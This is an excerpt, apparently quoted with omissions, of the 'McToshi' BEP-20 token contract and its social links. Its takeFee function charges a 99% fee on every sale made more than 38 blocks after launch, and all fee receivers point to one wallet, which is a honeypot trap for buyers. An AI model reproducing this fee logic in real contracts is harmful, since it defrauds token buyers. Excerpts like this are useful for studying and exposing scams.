...
Telegram - https://t.me/mctoshiofficial
Website  - https://mctoshi.com/
Twitter  - https://twitter.com/mctoshibsc
...
contract McToshi is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "McToshi";
    string constant _symbol = "McToshi";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1 * 10**9 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply / 100;
    uint256 public _maxWalletToken = _totalSupply / 33;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xF832FfE25ee21DDc70d55748CeD449a4d43cFDF1;
        teamFeeReceiver = 0xF832FfE25ee21DDc70d55748CeD449a4d43cFDF1;
        utilityFeeReceiver = 0xF832FfE25ee21DDc70d55748CeD449a4d43cFDF1;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 38 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
